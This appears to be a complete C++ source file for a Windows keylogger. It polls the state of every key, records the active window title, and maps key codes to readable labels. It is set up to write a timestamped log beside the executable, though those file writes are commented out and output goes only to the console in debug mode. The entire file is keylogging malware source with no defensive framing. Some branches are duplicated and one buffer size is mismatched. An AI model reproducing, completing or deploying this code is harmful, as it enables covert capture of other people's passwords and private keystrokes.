#include "stdafx.h"
#include "main.h"

#include <string>
#include <windows.h>
#include <stdlib.h>

std::string intToString(int);
std::string getSelfPath();
std::string dirBasename(std::string);

#define FILEEXT ".log"
#define DEBUG
#define DEBUG_TO_LOGS

std::string intToString(int i) 
{
//#ifdef DEBUG
	printf("Converting: %d to string.\n", i);
//#endif
	char buffer[4];
	_itoa_s(i, buffer, 4, 10);
	return std::string(buffer);
}

std::string getSelfPath() 
{
#ifdef DEBUG
	printf("getSelfPath() ");
#endif
	char selfpath[MAX_PATH];
	wchar_t selfpath_wchar[MAX_PATH];

	GetModuleFileName(NULL, selfpath_wchar, MAX_PATH);
	size_t pReturnValue;
	wcstombs_s(&pReturnValue, selfpath, MAX_PATH, selfpath_wchar, MAX_PATH);

	return std::string(selfpath);
}

std::string dirBasename(std::string path) 
{
#ifdef DEBUG
	printf("dirBasename() ");
#endif
	if (path.empty())
		return std::string("");

	if (path.find("\\") == std::string::npos)
		return path;

	if (path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);

	size_t pos = path.find_last_of("\\");
	if (pos != std::string::npos)
		path = path.substr(0, pos);

	if (path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);

	return path;
}






int main(int argc, char *argv[])
{	
	std::string basepath = dirBasename(getSelfPath());
	
	time_t rawtime;
	struct tm timeinfo;
	time(&rawtime);
	localtime_s(&timeinfo, &rawtime);
	char filename[MAX_PATH];
	char filepath[MAX_PATH];
	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", &timeinfo);
	sprintf_s(filepath, MAX_PATH, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
	
#ifdef DEBUG
	printf("Saving content to: filepath '%s'\n", filepath);
#endif // DEBUG

	
	std::string lastTitle = "";
	//std::ofstream file_logs(filepath);
	
	//SHORT lastc = 0;
	while(1)
	{
		Sleep(10); // give other programs time to run
		
#ifdef DEBUG_TO_LOGS
		//printf("Geting title of the window.\n");
#endif
		// get the active windowtitle
		char title[1024];
		wchar_t title_wchar[1024];
		HWND hwndHandle = GetForegroundWindow();
		GetWindowText(hwndHandle, title_wchar, 1023);

#ifdef DEBUG_TO_LOGS
		// save window name
#endif

		size_t pReturnValue;
		wcstombs_s(&pReturnValue, title, MAX_PATH, title_wchar, MAX_PATH);


		if(lastTitle != title)
		{
			//file_logs << std::endl << std::endl << "Window: ";
#ifdef DEBUG
			std::cout << std::endl << std::endl << "Window: ";
#endif
			if(strlen(title) == 0)
			{
				//file_logs << "NO ACTIVE WINDOW";
#ifdef DEBUG
				std::cout << "NO ACTIVE WINDOW";
#endif
			}
			else
			{
				//file_logs << "'" << title << "'";
#ifdef DEBUG
				std::cout << "'" << title << "'";
#endif
			}
			//file_logs << std::endl;
#ifdef DEBUG
			std::cout << std::endl;
#endif
			
			lastTitle = title;
		}
		// logging keys, thats the keylogger
		for (unsigned char c = 1; c < 255; c++)
		{
#ifdef DEBUG_TO_LOGS
			//printf("Calling GetAsyncKeyState()", filepath);
#endif // DEBUG
			SHORT return_value = GetAsyncKeyState(c);
#ifdef DEBUG_TO_LOGS
			//printf("GetAsyncKeyState() returned: %d", return_value);
#endif // DEBUG
			if (return_value & 1)
			{ // on press button down
				std::string out = "";
				if (c == 1)
					out = "[LMOUSE]"; // mouse left
				else if (c == 2)
					out = "[RMOUSE]"; // mouse right
				else if (c == 4)
					out = "[MMOUSE]"; // mouse middle
				else if (c == 13)
					out = "[RETURN]";
				else if (c == 16 || c == 17 || c == 18)
					out = "";
				else if (c == 160 || c == 161) // lastc == 16
					out = "[SHIFT]";
				else if (c == 162) // lastc == 17
					out = "[LEFT CTRL]";
				else if (c == 163) // lastc == 17
					out = "[RIGHT CTRL]";
				else if (c == 164) // lastc == 18
					out = "[ALT]";
				else if (c == 165)
					out = "[ALT GR]";
				else if (c == 8)
					out = "[BACKSPACE]";
				else if (c == 9)
					out = "[TAB]";
				else if (c == 20)
					out = "[CAPS LOCK]";
				else if (c == 27)
					out = "[ESC]";
				else if (c == 33)
					out = "[PAGE UP]";
				else if (c == 34)
					out = "[PAGE DOWN]";
				else if (c == 35)
					out = "[HOME]";
				else if (c == 36)
					out = "[POS1]";
				else if (c == 37)
					out = "[ARROW LEFT]";
				else if (c == 38)
					out = "[ARROW UP]";
				else if (c == 39)
					out = "[ARROW RIGHT]";
				else if (c == 40)
					out = "[ARROW DOWN]";
				else if (c == 45)
					out = "[INS]";
				else if (c == 46)
					out = "[DEL]";
				else if ((c >= 65 && c <= 90)
					|| (c >= 48 && c <= 57)
					|| c == 32) // letters and numbers
					out = c;

				else if (c == 91 || c == 92)
					out = "[WIN]";
				else if (c >= 96 && c <= 105)
					out = "[NUM " + intToString(c - 96) + "]";
				else if (c == 106)
					out = "[NUM /]";
				else if (c == 107)
					out = "[NUM +]";
				else if (c == 109)
					out = "[NUM -]";
				else if (c == 109)
					out = "[NUM ,]";
				else if (c >= 112 && c <= 123)
					out = "[F" + intToString(c - 111) + "]";
				else if (c == 144)
					out = "[NUM]";
				else if (c == 192)
					out = "[OE]";
				else if (c == 222)
					out = "'";
				else if (c == 186)
					out = ";";
				else if (c == 186)
					out = "+";
				else if (c == 188)
					out = ",";
				else if (c == 189)
					out = "-";
				else if (c == 190)
					out = ".";
				else if (c == 191)
					out = "/";
				else if (c == 219)
					out = "[";
				else if (c == 220)
					out = "\\";
				else if (c == 221)
					out = "]";
				else if (c == 226)
					out = "<";
				else
					out = intToString(c);
				
				
#ifdef DEBUG
				printf("Key = %s (%d)\n", out.c_str(), c);
#endif
				//file_logs << out;
				//file_logs.flush();
				
				//lastc = c;
			}
		}
		
	}
	
	//file_logs.close();
	
	return 0;
}
